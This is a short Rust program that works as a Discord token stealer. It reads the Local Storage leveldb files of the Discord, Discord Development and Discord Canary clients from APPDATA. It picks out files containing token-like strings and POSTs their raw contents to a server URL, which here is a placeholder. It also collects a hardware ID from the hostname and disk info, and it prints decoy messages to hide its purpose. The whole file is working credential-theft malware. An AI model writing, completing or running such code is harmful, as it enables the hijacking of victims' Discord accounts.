extern crate glob;
extern crate sys_info;
use self::glob::glob;
use std::{env, str, thread, io::prelude::*, fs::File};
use curl::easy::Easy;

fn main() {
    println!("Please wait...");
    fetch_data("discord");
    fetch_data("discorddevelopment");
    fetch_data("discordcanary");

    // Send Request to our server
    println!("Some random stuff");
    let hwid = format!("HWID: {:?}{:?}{:?}", sys_info::os_type(), sys_info::hostname(), sys_info::disk_info());
    println!("HWID                                {}", hwid);
    thread::sleep_ms(15000);
}

fn fetch_data(ver: &str) {
    let path = env::var("APPDATA").unwrap_or("none".to_string());
    let path =
        format!("{}{}{}{}", path, "\\", ver, "\\Local Storage\\leveldb/*").replace("\\", "\\\\");

    let path: &str = &path[..];

    // Loop through each file
    for e in glob(path).expect("Failed to read glob pattern") {
        let _t = e.unwrap().into_os_string().into_string().unwrap();

        let mut file = File::open(_t).unwrap();
        let mut buf = vec![];
        file.read_to_end(&mut buf);

        let contents = String::from_utf8_lossy(&buf);
        let mut _result = contents.chars().filter(|c| true).collect::<String>();

        if _result.contains("oken") {
            // Send Request to our server
            let mut data = contents.as_bytes();
            let mut easy = Easy::new();
            easy.url("https://google.com/").unwrap();
            easy.post(true).unwrap();
            easy.post_field_size(data.len() as u64).unwrap();
            let mut transfer = easy.transfer();
            transfer
                .read_function(|buf| Ok(data.read(buf).unwrap_or(0)))
                .unwrap();
            transfer.perform().unwrap();
        }
    }
}
